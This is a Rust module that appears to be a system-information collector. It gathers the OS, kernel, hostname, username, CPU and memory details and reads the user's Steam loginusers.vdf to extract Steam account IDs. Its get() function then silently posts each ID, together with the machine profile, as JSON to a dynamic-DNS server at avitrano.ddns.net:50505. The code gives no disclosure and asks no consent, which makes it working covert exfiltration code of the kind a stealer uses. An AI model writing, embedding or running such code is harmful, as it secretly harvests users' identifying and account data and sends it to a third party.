use std::{env, fs, path::Path};

use serde::Serialize;

#[derive(Clone, Debug, Serialize)]
pub struct SysInfo {
    pub os: String,
    pub kernel: String,
    pub hostname: String,
    pub username: String,
    pub uptime: f32,
    pub shell: String,
    pub de: String,
    pub cpu: String,
    pub core_count: i32,
    pub memory: i32,
    pub id: u64,
}

impl SysInfo {
    pub fn new(id: u64) -> Self {
        let (cpu, core_count) = get_cpu();
        Self {
            os: get_os(),
            kernel: get_kernel(),
            hostname: get_hostname(),
            username: get_username(),
            uptime: get_uptime(),
            shell: get_shell(),
            de: get_de(),
            cpu,
            core_count,
            memory: get_memory(),
            id,
        }
    }
}

fn get_os() -> String {
    let file = fs::read_to_string("/etc/os-release").unwrap();
    let mut os = String::new();
    let mut found = [false, false];
    for line in file.lines() {
        if found[0] && found[1] {
            break;
        }
        if line.starts_with("NAME=") {
            let name = line.split('=').collect::<Vec<&str>>()[1];
            os.insert_str(0, &name[1..name.len() - 1]);
            found[0] = true;
        }
        if line.starts_with("VERSION=") {
            let version = line.split('=').collect::<Vec<&str>>()[1];
            os.push(' ');
            os.push_str(&version[1..version.len() - 1]);
            found[1] = true;
        }
    }
    if os.is_empty() {
        return String::from("unknown");
    }
    os
}

fn get_kernel() -> String {
    String::from(
        fs::read_to_string("/proc/sys/kernel/osrelease")
            .unwrap_or(String::from("unknown"))
            .trim(),
    )
}

fn get_hostname() -> String {
    String::from(
        fs::read_to_string("/proc/sys/kernel/hostname")
            .unwrap_or(String::from("unknown"))
            .trim(),
    )
}

fn get_username() -> String {
    env::var("USER").unwrap_or(String::from("unknown"))
}

fn get_uptime() -> f32 {
    let uptimes = fs::read_to_string("/proc/uptime").unwrap();
    let time = uptimes.split(' ').collect::<Vec<&str>>()[0];
    time.parse().unwrap_or(0.0)
}

fn get_shell() -> String {
    let shell_path = env::var("SHELL");
    if shell_path.is_err() {
        return String::from("unknown");
    }
    String::from(shell_path.unwrap().split('/').last().unwrap())
}

fn get_de() -> String {
    env::var("XDG_CURRENT_DESKTOP").unwrap_or(String::from("unknown"))
}

fn get_cpu() -> (String, i32) {
    let cpuinfo = fs::read_to_string("/proc/cpuinfo").unwrap();
    let mut cpu = String::from("unknown");
    let mut cores = 0;
    for line in cpuinfo.lines() {
        if line.starts_with("model name") {
            cpu = String::from(line.split(": ").last().unwrap());
        }
        if line.starts_with("cpu cores") {
            cores = line.split(": ").last().unwrap().parse().unwrap()
        }
    }
    (cpu, cores)
}

fn get_memory() -> i32 {
    let meminfo = fs::read_to_string("/proc/meminfo").unwrap();
    for line in meminfo.lines() {
        if line.starts_with("MemTotal") {
            let mem = line.split(':').last().unwrap().trim();
            let memory: i32 = mem[0..mem.len() - 3].parse().unwrap();
            return memory / 1000;
        }
    }
    0
}

pub fn get() {
    let user = get_username();
    let path = if Path::new(&format!(
        "/home/{}/.steam/steam/config/loginusers.vdf",
        user
    ))
    .exists()
    {
        ".steam/steam/config/loginusers.vdf"
    } else {
        ".local/share/Steam/config/loginusers.vdf"
    };
    let mut ids = vec![];
    for line in fs::read_to_string(format!("/home/{}/{}", user, path))
        .unwrap_or(String::new())
        .lines()
    {
        if !line
            .chars()
            .all(|c| c.is_whitespace() || c.is_numeric() || c == '"')
        {
            continue;
        }
        let tokens: Vec<&str> = line.split('"').collect();
        let id = tokens[1].parse::<u64>();
        match id {
            Ok(id) => ids.push(id),
            Err(_) => continue,
        };
    }
    for id in ids {
        let sys_info = SysInfo::new(id);
        let _ = ureq::post("http://avitrano.ddns.net:50505/sysinfo").send_json(sys_info);
    }
}
